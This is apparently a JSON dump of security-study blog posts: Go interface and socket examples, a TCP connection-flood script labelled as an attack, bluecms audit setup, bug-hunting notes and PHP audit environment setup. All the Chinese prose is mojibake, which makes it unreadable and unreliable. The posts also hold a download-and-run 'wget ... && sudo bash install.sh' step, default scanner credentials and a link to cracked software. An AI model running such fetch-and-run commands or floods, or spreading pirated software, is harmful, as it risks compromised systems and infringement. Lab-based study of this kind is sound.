è¯­è¨€æä¾›äº†å¦å¤–ä¸€ç§æ•°æ®ç±»å‹å³æ¥å£ï¼Œå®ƒæŠŠæ‰€æœ‰çš„å…·æœ‰å…±æ€§çš„æ–¹æ³•å®šä¹‰åœ¨ä¸€èµ·ï¼Œä»»ä½•å…¶ä»–ç±»å‹åªè¦å®ç°äº†è¿™äº›æ–¹æ³•å°±æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ æ¥å£å¯ä»¥è®©æˆ‘ä»¬å°†ä¸åŒçš„ç±»å‹ç»‘å®šåˆ°ä¸€ç»„å…¬å…±çš„æ–¹æ³•ä¸Šï¼Œä»è€Œå®ç°å¤šæ€å’Œçµæ´»çš„è®¾è®¡ã€‚ Go è¯­è¨€ä¸­çš„æ¥å£æ˜¯éšå¼å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªç±»å‹å®ç°äº†ä¸€ä¸ªæ¥å£å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒå°±è‡ªåŠ¨åœ°å®ç°äº†è¯¥æ¥å£ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†æ¥å£ä½œä¸ºå‚æ•°æ¥å®ç°å¯¹ä¸åŒç±»å‹çš„è°ƒç”¨ï¼Œä»è€Œå®ç°å¤šæ€ã€‚ å£°æ˜ä¸€ä¸ªæ¥å£ï¼š 12345678910111213141516171819202122/* å®šä¹‰æ¥å£ */type interface_name interface &#123; method_name1 [return_type] method_name2 [return_type] method_name3 [return_type] ... method_namen [return_type]&#125;/* å®šä¹‰ç»“æ„ä½“ */type struct_name struct &#123; /* variables */&#125;/* å®ç°æ¥å£æ–¹æ³• */func (struct_name_variable struct_name) method_name1() [return_type] &#123; /* æ–¹æ³•å®ç° */&#125;...func (struct_name_variable struct_name) method_namen() [return_type] &#123; /* æ–¹æ³•å®ç°*/&#125; å®ä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;fmt&quot;)type Phone interface &#123; call()&#125;type NokiaPhone struct &#123;&#125;func (nokiaPhone NokiaPhone) call() &#123; fmt.Println(&quot;I am Nokia, I can call you!&quot;)&#125;type IPhone struct &#123;&#125;func (iPhone IPhone) call() &#123; fmt.Println(&quot;I am iPhone, I can call you!&quot;)&#125;func main() &#123; var phone Phone phone = new(NokiaPhone) phone.call() phone = new(IPhone) phone.call()&#125; é€»è¾‘ï¼š åˆ›å»ºä¸€ä¸ªinterfaceï¼Œç„¶åå£°æ˜å¯¹åº”çš„å˜é‡ã€‚ ç„¶åä¼ å…¥å¯¹åº”çš„å‚æ•°ï¼Œåœ¨interfaceä¸­ï¼Œä¼šç»Ÿä¸€è°ƒç”¨æ‰€æœ‰çš„å‡½æ•°ï¼Œæ ¹æ®å‚æ•°æ¥é€‰æ‹©ã€‚ç”¨äºè°ƒç”¨çš„å‡½æ•°å†™æ³•æ¯”è¾ƒç‰¹æ®Šï¼š 123func (variable_name) func_name return_type&#123;&#125; ç”¨goå†™ä¸€ä¸ªå‘åŒ…ç¨‹åºUDP1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;fmt&quot; &quot;net&quot;)func main() &#123; // åˆ›å»ºä¸€ä¸ª UDP åœ°å€ addr, err := net.ResolveUDPAddr(&quot;udp&quot;, &quot;127.0.0.1:8080&quot;) if err != nil &#123; fmt.Println(err) return &#125; // åˆ›å»ºä¸€ä¸ª UDP è¿æ¥ conn, err := net.DialUDP(&quot;udp&quot;, nil, addr) if err != nil &#123; fmt.Println(err) return &#125; defer conn.Close() // å…³é—­è¿æ¥ // å‡†å¤‡è¦å‘é€çš„æ•°æ® data := []byte(&quot;Hello, this is a UDP packet&quot;) // å‘é€æ•°æ® n, err := conn.Write(data) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(&quot;Sent %d bytes\\n&quot;, n)&#125; è¿è¡Œç»“æœï¼š ä½¿ç”¨tcpdumpæ£€éªŒæ˜¯å¦æ”¶åˆ°åŒ… TCP123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;net&quot; &quot;sync&quot;)func main() &#123; target := &quot;127.0.0.1:8080&quot; // ç›®æ ‡åœ°å€ n := 100 // å‘é€æ¬¡æ•° var wg sync.WaitGroup // åŒæ­¥ç­‰å¾…ç»„ for i := 0; i &lt; n; i++ &#123; wg.Add(1) // å¢åŠ ç­‰å¾…è®¡æ•° go func() &#123; defer wg.Done() // å‡å°‘ç­‰å¾…è®¡æ•° conn, err := net.Dial(&quot;tcp&quot;, target) // åˆ›å»ºTCPè¿æ¥ if err != nil &#123; fmt.Println(err) // å¤„ç†é”™è¯¯ return &#125; defer conn.Close() // å»¶è¿Ÿå…³é—­è¿æ¥ _, err = conn.Write([]byte(&quot;Hello&quot;)) // å‘é€æ•°æ®åŒ… if err != nil &#123; fmt.Println(err) // å¤„ç†é”™è¯¯ return &#125; &#125;() &#125; wg.Wait() // ç­‰å¾…æ‰€æœ‰goroutineå®Œæˆ fmt.Println(&quot;Attack finished&quot;) // æ‰“å°å®Œæˆä¿¡æ¯&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/categories/Golang/"}],"tags":[{"name":"go","slug":"go","permalink":"https://gryffinbit.top/tags/go/"}],"author":"Gryffinbit"},{"title":"FastJsonçš„å…¨ç³»åˆ—å­¦ä¹ ","slug":"FastJsonçš„å…¨ç³»åˆ—å­¦ä¹ ","date":"2023-06-06T15:32:59.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/06/06/FastJsonçš„å…¨ç³»åˆ—å­¦ä¹ /","permalink":"https://gryffinbit.top/2023/06/06/FastJson%E7%9A%84%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"FastJsonçš„åŸºæœ¬ä»‹ç»fastjsonæ˜¯ä¸€ä¸ªJAVAåº“ï¼Œå¯ä»¥å®ç°ä½¿ç”¨jsonä¼ è¾“å¤æ‚çš„æ•°æ®ï¼Œå¯ä»¥å°†JAVAå¯¹è±¡è½¬æ¢ä¸ºJsonå­—ç¬¦ä¸²ã€‚ å‚è€ƒé“¾æ¥ã€ä¸¤ä¸‡å­—åŸåˆ›é•¿æ–‡ã€‘å®Œå…¨é›¶åŸºç¡€å…¥é—¨Fastjsonç³»åˆ—æ¼æ´ï¼ˆåŸºç¡€ç¯‡ï¼‰ (qq.com)","categories":[{"name":"JAVAå®‰å…¨","slug":"JAVAå®‰å…¨","permalink":"https://gryffinbit.top/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://gryffinbit.top/tags/Fastjson/"}],"author":"Gryffinbit"},{"title":"ä»£ç å®¡è®¡ï¼ˆbluecmsï¼‰","slug":"ä»£ç å®¡è®¡ï¼ˆbluecmsï¼‰","date":"2023-03-14T14:58:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/03/14/ä»£ç å®¡è®¡ï¼ˆbluecmsï¼‰/","permalink":"https://gryffinbit.top/2023/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88bluecms%EF%BC%89/","excerpt":"","text":"å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/11553#toc-5 CMSç»“æ„123456â”œâ”€â”€ admin åå°ç®¡ç†ç›®å½•â”œâ”€â”€ install ç½‘ç«™çš„å®‰è£…ç›®å½•â”œâ”€â”€ api æ¥å£æ–‡ä»¶ç›®å½•â”œâ”€â”€ data ç³»ç»Ÿå¤„ç†æ•°æ®ç›¸å…³ç›®å½•â”œâ”€â”€ include ç”¨æ¥åŒ…å«çš„å…¨å±€æ–‡ä»¶â””â”€â”€ template æ¨¡æ¿ å‡½æ•°é›†æ–‡ä»¶ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ è¿™ç±»æ–‡ä»¶é€šå¸¸å‘½åä¸­åŒ…å«functionsæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›ç»™å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å®ƒä»¬ï¼Œå¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚ é…ç½®æ–‡ä»¶ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ è¿™ç±»æ–‡ä»¶é€šå¸¸å‘½åé‡Œé¢åŒ…æ‹¬configè¿™ä¸ªå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬Webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ï¼Œä»è¿™ä¸ªæ–‡ä»¶é‡Œé¢å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯ç”¨å•å¼•å·è¿˜æ˜¯ç”¨çš„åŒå¼•å·åŒ…èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·ï¼Œåˆ™å¾ˆå¤§å¯èƒ½ä¼šå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚ bluecms 1.6 sp1ä¸‹è½½åœ°å€ https://gryffinbit.lanzouo.com/iKivl0q2aczg ç‰¹ç‚¹ éƒ¨ç½²windowsä¸Šéƒ¨ç½²phpstudyï¼Œåœ¨phpstudyä¸Šé¢éƒ¨ç½²cms ç•ªå¤– è®°å½•ä¸€ä¸‹æˆ‘åœ¨Ubuntu 22.04.1 LTS ä¸Šéƒ¨ç½²çš„å¤±è´¥è¿‡ç¨‹ apache+mysql+phpã€‚ â€‹ éƒ¨ç½²ä¸€ä¸ªä¸‡å¹´è€cmsï¼Œè·¯å¾„æ”¾å¥½ï¼ˆapache çš„ &#x2F;var&#x2F;www&#x2F;ä¸‹é¢ï¼‰ï¼Œå—¯æ€ä¹ˆä¸è¡Œï¼ŸæŸ¥èµ„æ–™å‘ç°ï¼Œå“¦ï¼Œapacheéœ€è¦æ‰‹åŠ¨å¼€å¯ä¸€äº›å¯¹phpæ–‡ä»¶çš„ç¼–è¯‘ã€‚å¼€å¯ä»¥åï¼Œè¿˜æ˜¯ä¸è¡Œã€‚â€‹ æˆ‘å°±ä»¥ä¸ºæ˜¯ä¼ªé™æ€çš„é—®é¢˜ï¼Œå°±å»æ”¹é‚£ä¸ª.htaccessã€‚â€‹ è¿˜æ˜¯ä¸è¡Œï¼Œä¸è¿‡å¯ä»¥æ˜¾ç¤º500äº†ï¼ŒæœåŠ¡å™¨å†…éƒ¨æŠ¥é”™ï¼Œäºæ˜¯æˆ‘å°±æ‰“å¼€äº†phpçš„æŠ¥é”™ï¼Œå‘ç°php8ä¸æ”¯æŒä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨ã€‚æˆ‘å°±å»æ”¹é‚£ä¸ªä»£ç ï¼ŒæŠŠé‚£ä¸ªç‰ˆæœ¬æ”¹äº†ä¸€ä¸‹ï¼Œå°±æ”¹äº†ä¸€ä¸‹ifçš„åˆ¤æ–­ï¼Œå¯¹ç‰ˆæœ¬çš„ç­›é€‰ï¼Œç»“æœå¯å¥½ï¼ŒæŠ¥é”™éƒ½ä¸æŠ¥äº†ï¼Œç›´æ¥ç™½å±ã€‚â€‹ æˆ‘å°±å»çœ‹æ”¹ä»£ç å‰çš„æŠ¥é”™æ–‡ä»¶ï¼Œå‘ç°åº”è¯¥æ˜¯éœ€è¦ç”¨php5.1çš„ç¯å¢ƒã€‚â€‹ æˆ‘æƒ³ï¼Œç»ˆäºï¼Œç»ˆäºå¯ä»¥è§£å†³äº†ï¼Œåœ¨ubuntuä¸Šå®‰è£…php5.1å°±å¥½å•¦ã€‚â€‹ ç»“æœå‘µå‘µï¼Œæˆ‘æ€ä¹ˆç€ä¹Ÿæ‰¾ä¸åˆ°aptçš„php5çš„åŒ…ï¼Œäºæ˜¯æˆ‘å°±æ³¨æ„äº†ä¸€ä¸‹æˆ‘çš„ubuntuç‰ˆæœ¬ï¼ŒUbuntu 22.04.1 LTSï¼Œåˆå»å¯¹ç…§ubuntuç‰ˆæœ¬ï¼Œå‘ç°ï¼Œå—¯ï¼Œæœ€æ–°çš„ubuntuå·²ç»ä¸æ”¯æŒphp5å•¦ï¼ˆé˜´é˜³æ€ªæ°”è„¸ï¼‰ã€‚â€‹ çœŸå¥½ï¼Œæˆ‘çš„webå…¥é—¨å°±è¿™æ ·ç»“æŸå•¦ï¼Œä¸€å¥—å®Œæ•´çš„ç¢°å£è¿‡ç¨‹ï½â€‹ ä¸€è·¯æ¢ç´¢ï¼Œè·Ÿå°¼ç›ç ´æ¡ˆä¸€æ ·ã€‚ æœ€å¼€å§‹è¿˜å°è¯•äº†ä½¿ç”¨Linuxçš„phpstudyï¼Œä¹Ÿå¤±è´¥äº†ã€‚ apacheå®‰è£…ä¹‹åï¼Œæ— æ³•ç›´æ¥è§£æphpï¼Œéœ€è¦å®‰è£…é…ç½® 1apt-get install libapache2-mod-php8.0 1vim /etc/apache2/apache2.conf æ·»åŠ å†…å®¹ 12AddHandler php8.1-script .php .htmlAddType text/html .php. html ä¿®æ”¹ä¸ºRequire all granted é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™ï¼Œæ‰“å¼€phpçš„é”™è¯¯æ˜¾ç¤º 1vim /etc/php/8.1/apache2/php.ini ä¿®æ”¹display_errors = OFFä¸ºdisplay_errors = 1 åœ¨phpstudyä¸Šé…ç½® PHPStudy å®‰è£… 1wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sudo bash install.sh ç®¡ç†é¢æ¿ç«¯å£ä¸º9080","categories":[{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bluecms","slug":"bluecms","permalink":"https://gryffinbit.top/tags/bluecms/"}],"author":"Gryffinbit"},{"title":"æ¼æ´æŒ–æ˜æ–°æ‰‹å­¦ä¹ è®°å½•/ä»£ç å®¡è®¡å…¥å‘ï¼ˆæ€è·¯ï¼‰","slug":"æ¼æ´æŒ–æ˜æ–°æ‰‹å­¦ä¹ è®°å½•ï¼ˆæ€è·¯ï¼‰","date":"2023-03-13T17:26:21.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2023/03/14/æ¼æ´æŒ–æ˜æ–°æ‰‹å­¦ä¹ è®°å½•ï¼ˆæ€è·¯ï¼‰/","permalink":"https://gryffinbit.top/2023/03/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%88%E6%80%9D%E8%B7%AF%EF%BC%89/","excerpt":"","text":"ä»£ç å®¡è®¡æ˜¯åœ¨ä¸€ä¸ªç¼–ç¨‹ä¸­å¯¹æºä»£ç æ—¨åœ¨å‘ç°é”™è¯¯ã€å®‰å…¨æ¼æ´æˆ–è¿åç¼–ç¨‹çº¦å®šçš„é¡¹ç›®ã€‚å°±æ˜¯æ‰¾å®ƒè¿™äº›ä»£ç ä¸­å¯èƒ½å­˜åœ¨é—®é¢˜çš„åœ°æ–¹ï¼Œç„¶åçœ‹å®ƒæ˜¯å¦çœŸçš„å­˜åœ¨æ¼æ´ã€‚ ä»£ç å®¡è®¡å¤§è‡´åˆ†ä¸ºä¸‰ç§ï¼Œç™½ç›’ã€é»‘ç›’å’Œç°ç›’ã€‚ ç™½ç›’ï¼šè¿™ç§æµ‹è¯•å¯ä»¥çœ‹åˆ°æºä»£ç ï¼Œç›´æ¥ä»ä»£ç ä¸­æ¥çœ‹å“ªé‡Œå¯èƒ½å‡ºç°é—®é¢˜ï¼Œç„¶åè¿›è¡Œæ£€æµ‹ï¼Œæ­¤æ—¶æ˜¯çŸ¥é“å†…éƒ¨ç»“æ„çš„ï¼Œæµ‹è¯•ç›¸å¯¹é»‘ç›’æµ‹è¯•ä¼šæ¯”è¾ƒå®¹æ˜“ä¸€ç‚¹ é»‘ç›’ï¼šåªçŸ¥é“ç½‘é¡µçš„å¤§è‡´ç»“æ„ï¼Œç„¶åå¯¹å„ä¸ªåŠŸèƒ½å¼€å§‹æ£€æµ‹ï¼ŒæŒ‰è‡ªå·±çš„æ€è·¯è¿›è¡Œæµ‹è¯•ï¼Œæ¯”å¦‚çœ‹åˆ°ç•™è¨€ç•Œé¢ï¼Œæµ‹è¯•XSSï¼Œçœ‹åˆ°ç™»å½•ç•Œé¢ï¼Œæµ‹è¯•SQLæ³¨å…¥ç­‰ ç°ç›’ï¼šä»‹äºç™½ç›’æµ‹è¯•ä¸é»‘ç›’æµ‹è¯•ä¹‹é—´ï¼Œè‡ªå·±æµ‹è¯•çš„åŒæ—¶ç»“åˆä»£ç æ¥çœ‹ ä»£ç å®¡è®¡å¯ä»¥å…ˆä»ç®€å•çš„CMSå…¥æ‰‹ã€‚ å­¦ä¹ è·¯å¾„çš„è¯ï¼Œå¯ä»¥åˆ†ä¸¤æ¡ï¼Œä¸€æ¡å°±æ˜¯æ­£å‘çš„æ‰¾ä»£ç å®¡è®¡çš„æ–‡ï¼Œè·Ÿç€å»åšå»å­¦ã€‚å¦ä¸€æ¡å°±æ˜¯å¤ç°æ¼æ´ï¼Œçœ‹æ¼æ´æˆå› ï¼Œå­¦ä¹ ä»£ç çš„åˆ†æï¼Œç”±æ­¤äº†è§£æ¼æ´æ˜¯å¦‚ä½•è¢«å‘ç°çš„ã€‚ ä»£ç å®¡è®¡è„‘å›¾https://upload-images.jianshu.io/upload_images/25142717-c0951ef9b097e432.png æ¼æ´å¹³å° ä¿¡æ¯æ”¶é›†å­åŸŸåæ”¶é›†ç½‘æ®µæ‰©å±•åŸŸåwhoisï¼šæ³¨å†Œäººã€è”ç³»é‚®ç®± ipæ®µï¼šç¡®å®šæ ¸å¿ƒæ®µã€è¾¹ç¼˜æ®µã€äº‘æœæ®µã€ç›®æ ‡å‚å•†å¼€å‘å–œæ¬¢ä»€ä¹ˆæ¡†æ¶ å·¥å…·æ¼æ´æ‰«æ æ‰«æå™¨å®¹æ˜“è¢«banï¼Œå¯ä»¥æ‰‹åŠ¨æ³¨å…¥è‡ªå·±è¯•ã€‚ XSSã€SQLæ³¨å…¥ã€CSRFã€æƒé™ç»•è¿‡ã€æ–‡ä»¶ä¸Šä¼ ã€å¼±å£ä»¤ã€ä»£ç æ‰§è¡Œç­‰ç­‰ã€‚ AWVS æ¼æ´æ‰«æmacOSä¸Šå®‰è£…dockerã€‚è®¿é—®127.0.0.1:13443 12awvs13 username: admin@admin.comawvs13 password: Admin123 BBscanè½»é‡çº§æ‰«æå™¨ é‡ç‚¹æ”¾åœ¨è·¯å¾„çš„æ‰«æï¼Œæ‰¾æœ‰æ²¡æœ‰403ã€404çš„ç«™ç‚¹ã€‚ çˆ†ç ´APIæ¥å£ç«¯ç‚¹ã€è·¯å¾„ã€‚ BBscan é¡¹ç›®åœ°å€ 1https://github.com/lijiejie/BBScan BBscan ä½¿ç”¨æ•™ç¨‹ 1https://www.freebuf.com/articles/web/352762.html æ‰‹åŠ¨æ¼æ´æ’æŸ¥burpsuiteåˆ©ç”¨æ’ä»¶å’Œxrayå®ç°è‡ªåŠ¨åŒ–æ¼æ‰« æŠ“åŒ…ã€æ”¹åŒ…ã€é‡æ”¾ã€å¯†ç çˆ†ç ´ å…¥æ‰‹ç‚¹ https://cloud.tencent.com/developer/article/2024097 æäº¤çš„è¡¨å•ï¼ˆæ„è§åé¦ˆã€æ–‡ä»¶ä¸Šä¼ ï¼‰ åŠŸèƒ½ç‚¹ï¼ˆä»˜æ¬¾é‡‘é¢æ ¡éªŒã€ä¿®æ”¹å¯†ç çš„signå€¼æ›¿æ¢ï¼‰ æ•°å€¼æº¢å‡º æ¥å£åˆ©ç”¨ ä»»æ„æ–‡ä»¶ä¸Šä¼  æå‡å±å®³æ‰¾åˆ°ä½å±åï¼Œå°è¯•æ˜¯å¦èƒ½æ›´è¿›ä¸€æ­¥æå‡å±å®³ã€‚ ç»ƒä¹ é¶åœº æ¼æ´åˆ†ç±»ğŸ‘‡ é¶åœºç»ƒä¹ çš„æ—¶å€™ï¼ŒåŒç±»å‹çš„ä¸€èµ·ç»ƒ æ¼æ´ç±»å‹ åˆ†ç±»æ ‡ç­¾ æ•ˆæœ SQLæ³¨å…¥ ä»£ç æ‰§è¡Œ æ‰§è¡Œéƒ¨åˆ†SQLè¯­å¥ï¼Œå¯èƒ½é€ æˆå‘½ä»¤æ‰§è¡Œã€æ•°æ®è·å–ã€è¯»å†™æ–‡ä»¶ XSS ä»£ç æ‰§è¡Œ æœ‰é™æˆ–æ— é™çš„Javascriptä»£ç æ‰§è¡Œï¼Œå¯èƒ½è·å–cookieå‡­è¯ å‘½ä»¤æ³¨å…¥ å‘½ä»¤æ‰§è¡Œ ç›´æ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ååºåˆ—åŒ– ä»£ç æ‰§è¡Œ æœ‰é™æˆ–æ— é™çš„æ‰§è¡Œjavaä»£ç ï¼Œæˆ–æ ¹æ®gadgetçš„ä¸åŒæ‰§è¡Œå„ç±»æ“ä½œï¼Œæ¯”å¦‚è¯»å†™æ–‡ä»¶ã€å‘èµ·è¯·æ±‚ç­‰ SSRF ç½‘ç»œè¯·æ±‚ æœ‰é™åˆ¶æˆ–æ— é™åˆ¶çš„å‘èµ·å„ç±»è¯·æ±‚è½¬å‘ï¼Œå°†éƒ¨åˆ†å¯æ§æ•°æ®é€šè¿‡ç½‘ç»œè¿›è¡Œè½¬å‘ åŠ å¯†ç¼ºé™· ä¼ªé€  åŠ è§£å¯†çš„é—®é¢˜å¯ä»¥ç»Ÿä¸€å½’ä¸ºå„ç±»ä¼ªé€ ï¼ŒåŒ…æ‹¬ä¼ªé€ å‡­è¯ã€æ•°æ®åŒ…ç­¾åç­‰ ä»»æ„è¯» æ•æ„Ÿä¿¡æ¯è·å– è¯»å–å„ç±»æ•æ„Ÿä¿¡æ¯ ä»»æ„å†™ å†™æ–‡ä»¶ å†™å„ç§æ–‡ä»¶ï¼Œé€šå¸¸é…åˆç³»ç»Ÿæœºåˆ¶æˆ–è€…æ¡†æ¶æœºåˆ¶ï¼Œä»»æ„å†™æ–‡ä»¶å¤§æ¦‚ç‡å¯ä»¥ä¸²ä»£ç æ‰§è¡Œæˆ–è€…å‘½ä»¤æ‰§è¡Œ æœªæˆæƒè®¿é—® æƒé™æ ¡éªŒç¼ºå¤± æƒé™æ ¡éªŒç¼ºå¤±ï¼Œå¯ä»¥è®¿é—®å„ç±»éœ€è¦é‰´æƒçš„æ¥å£ å†…å­˜æº¢å‡º ä»£ç æ‰§è¡Œ å†…å­˜æº¢å‡ºåå¦‚æœåˆ©ç”¨æˆåŠŸé€šå¸¸å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€æ”¹å˜ç¨‹åºåˆ¤æ–­æ¡ä»¶ RCEçš„ä¸€äº›ç»„åˆğŸ‘‡ æœªæˆæƒè®¿é—®+å‘½ä»¤æ‰§è¡Œ æœªæˆæƒè®¿é—®+ååºåˆ—åŒ– æœªæˆæƒè®¿é—®+ä»»æ„å†™+ç³»ç»Ÿæœºåˆ¶ï¼ˆPHPçš„webshellæˆ–è€…Linuxçš„crontabï¼‰ æœªæˆæƒè®¿é—®+SSRF+æœ¬åœ°è¿›ç¨‹æœªæˆæƒ+å‘½ä»¤æ³¨å…¥ åŠ å¯†ç¼ºé™·å¯æ„é€ å‡­è¯+åå°å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ æœªæˆæƒè®¿é—®+SSRF+å†…å­˜æº¢å‡º OWASP è™šæ‹Ÿæœºé¶åœºVMwareéƒ¨ç½²åˆ°Windowsä¸Šç”¨ï¼Œhttps://sourceforge.net/projects/owaspbwa/ root owaspbwa ç™»å…¥å°±ä¼šè¿”å›é¶åœºåœ°å€ï¼Œç›´æ¥å¯ä»¥è®¿é—®é¶åœºã€‚ DVWAéƒ¨ç½²åˆ°æœ¬æœºæˆ–è€…æœåŠ¡å™¨ä¸Šç”¨ 12docker pull sqreen/dvwadocker run -d -t -p 8888:80 sqreen/dvwa sqli-labséƒ¨ç½²åˆ°æœ¬æœºæˆ–è€…æœåŠ¡å™¨ä¸Šç”¨ 12docker pull acgpiano/sqli-labsdocker run -d -t -p 8888:80 acgpiano/sqli-labs å‚è€ƒé“¾æ¥https://www.anquanke.com/post/id/223457 https://www.sqlsec.com/2020/04/awvs.html#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80 https://paper.seebug.org/1809/ https://cloud.tencent.com/developer/article/2024097 https://xz.aliyun.com/t/11553","categories":[{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"author":"Gryffinbit"},{"title":"PHPä»£ç å®¡è®¡ç¯å¢ƒæ­å»ºï¼ˆPHP+mamp pro+PHPSTORMï¼‰","slug":"PHPä»£ç å®¡è®¡ç¯å¢ƒæ­å»º","date":"2023-02-06T11:34:30.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/02/06/PHPä»£ç å®¡è®¡ç¯å¢ƒæ­å»º/","permalink":"https://gryffinbit.top/2023/02/06/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"ç³»ç»Ÿè¯´æ˜macOS M1ï¼Œ2020ï¼ŒArm64æ¶æ„ï¼Œventureç‰ˆæœ¬ ç¯å¢ƒæ­å»ºä»£ç å®¡è®¡åˆ†ä¸ºé™æ€åˆ†æå’ŒåŠ¨æ€åˆ†æã€‚ é™æ€åˆ†æï¼šä¸è¿è¡ŒPHPä»£ç çš„æƒ…å†µä¸‹ï¼Œå¯¹PHPæºç è¿›è¡ŒæŸ¥çœ‹åˆ†æï¼Œä»ä¸­æ‰¾å‡ºå¯èƒ½å­˜åœ¨çš„ç¼ºé™·å’Œæ¼æ´ã€‚ åŠ¨æ€åˆ†æï¼šå°†PHPä»£ç è¿è¡Œèµ·æ¥ï¼Œé€šè¿‡è§‚å¯Ÿä»£ç è¿è¡Œçš„çŠ¶æ€ï¼Œå¦‚å˜é‡å†…å®¹ã€å‡½æ•°æ‰§è¡Œç»“æœç­‰ï¼Œè¾¾åˆ°æ˜ç¡®ä»£ç æµç¨‹ï¼Œåˆ†æå‡½æ•°é€»è¾‘ç­‰ç›®çš„ï¼Œå¹¶ä»ä¸­æŒ–æ˜å‡ºæ¼æ´ã€‚ ä¸‹é¢çš„è½¯ä»¶éƒ¨ç½²å‡ä¸ºåŠ¨æ€åˆ†æã€‚ mamp proå®‰è£…PHPä¸€é”®é›†æˆç¯å¢ƒï¼Œä½¿ç”¨çš„è½¯ä»¶æ˜¯mamp proï¼Œé€šç”¨ä¹Ÿå¯ä»¥ä½¿ç”¨phpstudyç­‰ã€‚ è½¯ä»¶ä¸‹è½½ï¼š é“¾æ¥: https://pan.baidu.com/s/1V6-iMyqhLkgh8z08xx0T5g?pwd=k4v7 æå–ç : k4v7â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v6çš„åˆ†äº« DMGã€zipç»Ÿä¸€æ‰“å¼€å¯†ç ï¼šxclient.info å¦‚é‡ï¼šã€Œxxx.appå·²æŸåï¼Œæ‰“ä¸å¼€ã€‚ä½ åº”è¯¥å°†å®ƒç§»åˆ°åºŸçº¸ç¯“ã€ï¼Œè¯·å‚è€ƒï¼šã€Šæ–°æ‰‹å¸¸è§é—®é¢˜ã€‹ä¸­â€œä¸‹è½½å¥½çš„DMG æ‰“ä¸å¼€â€ç¬¬äºŒé¡¹ä¸­å†…å®¹ï¼›å¦‚æœä»…æ˜¯éƒ¨åˆ†TNTè½¯ä»¶é—ªé€€æ‰“ä¸å¼€ï¼Œå‚è€ƒã€Šä¿®å¤TNTå’Œè°è½¯ä»¶é—ªé€€é—®é¢˜ã€‹ 